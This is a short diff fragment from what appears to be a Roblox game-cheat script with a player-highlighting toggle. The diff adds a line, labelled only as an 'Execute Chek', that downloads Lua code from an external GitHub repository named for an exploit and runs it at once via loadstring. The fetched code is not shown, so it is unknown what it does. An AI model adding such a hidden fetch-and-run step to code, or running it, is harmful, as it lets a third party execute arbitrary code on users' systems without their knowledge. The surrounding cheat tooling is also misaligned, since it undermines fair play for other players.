@@ -859,3 +859,5 @@ local Toggle = Tabs.Misc:AddToggle("Highlight Players", {
     end
 })
 
+--Execute Chek
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StarX-exploit/executed/refs/heads/main/exe.lua"))()
